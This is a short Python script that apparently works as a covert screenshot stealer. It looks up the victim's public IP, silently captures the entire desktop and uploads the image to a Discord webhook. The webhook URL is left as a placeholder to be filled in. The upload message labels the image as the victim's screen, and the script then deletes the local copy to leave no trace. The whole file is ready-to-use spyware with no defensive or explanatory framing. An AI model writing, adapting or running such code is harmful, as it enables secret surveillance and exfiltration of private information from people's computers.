import os
import requests
from PIL import ImageGrab

WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL'

def get_user_ip():
    try:
        response = requests.get('https://api64.ipify.org?format=json')
        if response.status_code == 200:
            return response.json()['ip']
    except requests.RequestException:
        pass
    return "Unknown IP"

def capture_screenshot(file_path=None):
    if not file_path:
        temp_path = os.getenv('TEMP')
        file_path = os.path.join(temp_path, 'screenshot.png')
    screenshot = ImageGrab.grab()
    screenshot.save(file_path)
    return file_path

def send_screenshot_to_webhook(file_path, webhook_url, user_ip):
    with open(file_path, 'rb') as file:
        requests.post(
            webhook_url,
            files={'file': file},
            data={'content': f"Here is a screenshot of {user_ip} desktop screen."}
        )

def main():
    user_ip = get_user_ip()
    screenshot_path = capture_screenshot()
    send_screenshot_to_webhook(screenshot_path, WEBHOOK_URL, user_ip)
    if os.path.exists(screenshot_path):
        os.remove(screenshot_path)

if __name__ == '__main__':
    main()
